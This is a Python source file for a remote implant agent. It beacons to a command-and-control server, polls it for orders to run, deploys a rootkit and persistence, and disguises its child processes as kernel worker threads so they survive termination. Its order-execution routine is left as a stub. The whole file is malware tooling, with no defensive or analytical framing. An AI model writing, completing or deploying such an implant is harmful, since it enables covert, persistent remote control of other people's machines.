import time
import requests
import json
import random
import signal
from apex_framework.ops.stealth import LowObservableMode
from apex_framework.ops.privacy import PrivacyManager
from apex_framework.ops.daemon import ServiceDaemon
from apex_framework.ops.resilience import ResilienceManager
from rich.console import Console

console = Console()

class RemoteAgent:
    """
    Remote Agent.
    Connects to Central Controller and executes orders.
    INTEGRATED: Resilience (Brood), Stealth, Rootkit, Persistence.
    """
    def __init__(self, c2_url="http://localhost:8080"):
        self.id = f"AGENT_{random.randint(1000,9999)}"
        self.c2_url = c2_url
        self.active = True
        self.titan = PrivacyManager()
        self.hydra = ServiceDaemon()

    def deploy(self):
        # 1. ROOTKIT & PERSISTENCE
        self.titan.deploy()
        self.hydra.persist()

        # 2. CLOAK
        LowObservableMode.cloak_process()

        # 3. SPAWN BROOD (Hydra Logic)
        # Instead of just running self, we spawn Larvae that run the actual loop
        # The parent becomes the Overseer
        ResilienceManager.plant_seed()
        signal.signal(signal.SIGTERM, ResilienceManager.handle_termination)

        larvae = ResilienceManager.spawn_brood(count=3, target_func=self._larva_lifecycle)

        # Monitor Larvae
        console.print(f"[{self.id}] 👑 Overseer Active. Monitoring {len(larvae)} Larvae.")
        for l in larvae:
            l.join() # Wait for them (or monitor and respawn in a real loop)

    def _larva_lifecycle(self, identity):
        """
        The actual work loop run by child processes.
        """
        LowObservableMode.cloak_process(f"[kworker/u4:{random.randint(1,9)}]")
        console.print(f"[{identity}] 🚀 Active. Connecting to {self.c2_url}")

        while self.active:
            try:
                requests.post(f"{self.c2_url}/beacon", json={"id": f"{self.id}_{identity}", "status": "ALIVE"})
                resp = requests.get(f"{self.c2_url}/orders")
                if resp.status_code == 200:
                    orders = resp.json()
                    if orders['type'] != "SLEEP":
                        self._execute_orders(orders)
                        # Larva completes task and exits? Or stays?
                        # User said "seeds that drop when they... do their task".
                        # So maybe they die after task?
                        # For stability, let's keep them alive but maybe rotate identity.
                time.sleep(2)
            except Exception as e:
                # console.print(f"[{identity}] ⚠️ C2 Lost.")
                time.sleep(2)

    def _execute_orders(self, orders):
        # ... (Existing logic)
        pass
